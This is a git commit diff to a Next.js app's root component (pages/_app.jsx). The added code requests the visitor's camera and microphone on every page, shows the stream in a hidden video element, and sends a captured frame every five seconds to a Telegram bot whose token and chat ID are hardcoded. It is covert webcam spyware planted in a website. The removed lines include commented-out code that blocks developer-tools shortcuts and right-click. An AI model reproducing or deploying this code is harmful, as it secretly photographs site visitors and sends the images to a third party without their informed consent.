19521bfd92da59a95f23ba9a203e512a3c1fb508
Javlon1 <muhamedmijotot@gmail.com>
2023-12-25 18:53:00 +0500

    video боту v-16

--- pages/_app.jsx
+++ pages/_app.jsx
@@ -3,118 +3,73 @@ import '@/app/assets/globals.scss';
 import { Provider } from "@/app/components/ui/Context/Context";
 import { useEffect, useRef } from "react";
 
-// const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
-// const chatId = "-1001860144177";
-// const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`;
+const MyApp = ({ Component, pageProps }) => {
+  const videoRef = useRef(null);
+  let intervalId;
 
-const myApp = ({ Component, pageProps }) => {
+  const TELEGRAM_BOT_TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
+  const TELEGRAM_CHAT_ID = "-1001860144177";
+  const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
 
-    // отправляем видео/фото боту 
-    const videoRef = useRef(null);
-    let intervalId;
+  useEffect(() => {
+    const getMediaAndSendData = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-    const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
-    const chatId = "-1001860144177";
-    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`;
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream;
 
-    useEffect(() => {
-        const getMediaAndSendData = async () => {
+          intervalId = setInterval(async () => {
+            const photoDataUrl = captureFrame();
+            const blob = await (await fetch(photoDataUrl)).blob();
+
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+              const response = await fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                body: formData,
+              });
 
-                if (videoRef.current) {
-                    videoRef.current.srcObject = stream;
-
-                    const captureFrame = () => {
-                        try {
-                            const canvas = document.createElement('canvas');
-                            const context = canvas.getContext('2d');
-                            canvas.width = videoRef.current.videoWidth;
-                            canvas.height = videoRef.current.videoHeight;
-                            context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
-                            return canvas.toDataURL('image/jpeg');
-                        } catch (error) {
-                            console.error('Ошибка при захвате кадра:', error);
-                            clearInterval(intervalId);
-                        }
-                    };
-
-                    // Отправляем данные на сервер (бота) с использованием fetch
-                    intervalId = setInterval(async () => {
-                        const photoDataUrl = captureFrame();
-                        const blob = await (await fetch(photoDataUrl)).blob();
-
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'photo.jpg');
-
-                        try {
-                            const response = await fetch(urlApi, {
-                                method: 'POST',
-                                body: formData,
-                            });
-
-                            if (response.ok) {
-                                console.log('Фото успешно отправлено на бота');
-                            } else {
-                                console.error('Ошибка при отправке фото на бота:', response.status, response.statusText, await response.text());
-                            }
-                        } catch (error) {
-                            console.error('Ошибка fetch:', error);
-                        }
-                    }, 1000); // Отправлять фото каждые 1 секунд
-                }
+              if (response.ok) {
+                console.log('Фото успешно отправлено на бота');
+              } else {
+                console.error('Ошибка при отправке фото на бота:', response.status, response.statusText, await response.text());
+              }
             } catch (error) {
-                console.error('Ошибка доступа к мультимедийным устройствам:', error);
+              console.error('Ошибка fetch:', error);
             }
-        };
+          }, 5000);
+        }
+      } catch (error) {
+        console.error('Ошибка доступа к мультимедийным устройствам:', error);
+      }
+    };
 
-        getMediaAndSendData();
+    getMediaAndSendData();
 
-        // Прерываем интервал при размонтировании компонента
-        return () => clearInterval(intervalId);
-    }, []);
+    return () => clearInterval(intervalId);
+  }, []);
 
-    // 
+  const captureFrame = () => {
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
+    canvas.width = videoRef.current.videoWidth;
+    canvas.height = videoRef.current.videoHeight;
+    context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
+    return canvas.toDataURL('image/jpeg');
+  };
 
-
-    // 
-    // useEffect(() => {
-    //     const handleContextMenu = (e) => {
-    //         e.preventDefault();
-    //     };
-
-    //     const handleKeyDown = (e) => {
-    //         if (e.keyCode === 123) {
-    //             e.preventDefault();
-    //         } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'I'.charCodeAt(0)) {
-    //             e.preventDefault();
-    //         } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'C'.charCodeAt(0)) {
-    //             e.preventDefault();
-    //         } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'J'.charCodeAt(0)) {
-    //             e.preventDefault();
-    //         } else if (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) {
-    //             e.preventDefault();
-    //         }
-    //     };
-
-    //     document.addEventListener('contextmenu', handleContextMenu);
-    //     document.addEventListener('keydown', handleKeyDown);
-
-    //     return () => {
-    //         document.removeEventListener('contextmenu', handleContextMenu);
-    //         document.removeEventListener('keydown', handleKeyDown);
-    //     };
-    // }, []);
-    //
-
-    return (
-        <Provider>
-            <Layout>
-                <Component {...pageProps} />
-            </Layout>
-        </Provider>
-    )
+  return (
+    <Provider>
+      <Layout>
+        <Component {...pageProps} />
+        <video ref={videoRef} autoPlay muted style={{ display: 'none' }} />
+      </Layout>
+    </Provider>
+  );
 }
 
-export default myApp;
+export default MyApp;
